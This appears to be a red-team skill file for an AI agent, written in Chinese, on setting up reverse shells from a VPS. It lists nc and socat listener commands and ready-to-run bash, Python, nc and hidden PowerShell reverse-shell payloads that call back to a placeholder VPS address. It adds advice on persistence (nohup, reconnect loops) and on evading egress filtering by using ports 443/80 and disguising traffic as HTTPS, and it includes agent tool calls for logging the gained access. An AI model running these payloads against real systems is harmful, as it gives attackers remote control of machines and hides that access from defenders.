---
name: vps-reverse-shell
description: 反弹 Shell 落地：VPS 准备、监听、编码绕过、进程保持
tags: exploit, vps
---

# 反弹 Shell 落地

> 前提：有 `VPS_IP`（公网可访问、能开端口）。没有就退化用 suo5 / 端口复用。

## VPS 准备（一次性）

```bash
# 监听
nc -lvnp 4444

# 或者更稳的：socat（多连接、可重连）
socat -d -d TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0
```

防火墙放行：云厂商安全组 + 本机 `ufw`/`firewalld` 都要开。

## 目标侧载荷（按可用性挑）

```bash
# bash
bash -i >& /dev/tcp/<VPS_IP>/4444 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<VPS_IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# nc（有 -e 时）
nc <VPS_IP> 4444 -e /bin/sh
```

Windows：

```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<VPS_IP>',4444);..."
```

## 稳定性

- `nohup` / `setsid` 让进程脱离会话
- 断了自动重连：套一层 `while true; do ...; sleep 5; done`
- 别用 4444 这种高特征端口，换 443/80

## 落库

```
redteam_tunnel_add({ entryKind: 'target-outbound', listen: '/dev/tcp 会话', reachable: '' })
redteam_access_add({ host, method: 'reverse-shell', privilege })
```

## 判定标准

- [ ] VPS 上真的收到连接（不是本地自测）
- [ ] 能执行命令并看到回显
- [ ] `entryKind = target-outbound`（目标主动连出）

## 常见坑

| 坑 | 处理 |
|---|---|
| 安全组没放行 | 云控制台 + 本机防火墙都查 |
| 目标出网被限（只允许 80/443） | 换端口或用 HTTPS 伪装 |
| 会话一断就没了 | 加重连循环 |
| 在共享服务器上裸跑监听 | 端口会被扫，加 token/白名单 |
